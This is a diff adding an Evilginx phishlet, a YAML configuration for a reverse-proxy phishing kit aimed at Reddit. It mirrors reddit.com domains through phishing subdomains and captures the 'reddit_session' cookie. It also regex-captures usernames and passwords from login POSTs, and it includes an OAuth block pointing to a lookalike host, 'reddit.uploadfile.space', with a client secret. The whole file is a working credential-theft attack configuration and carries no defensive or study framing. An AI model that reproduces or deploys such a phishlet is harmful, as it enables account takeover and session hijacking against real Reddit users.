@@ -1,0 +1,43 @@
+author: '@customsync'
+min_ver: '3.0.0'
+redirect_url: 'https://www.reddit.com/'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'reddit.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'win', orig_sub: 'www', domain: 'redditstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'events', orig_sub: 'events', domain: 'reddit.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.redditstatic.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.redditstatic.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.redditstatic.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'src="https://{hostname}', replace: 'src="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'events.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'events.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.reddit.com'
+    keys: ['reddit_session:always']
+    type: 'cookie'
+auth_urls:
+  - '/login'
+  - '/'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.reddit.com'
+  path: '/login'
+oauth2:
+  client_id: 'evilginx-proxy-reddit'
+  client_secret: 'b4c5d6e7f8a901234567890abcdef1234567890abcdef1234567890abcdef1234'
+  redirect_uri: 'https://reddit.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
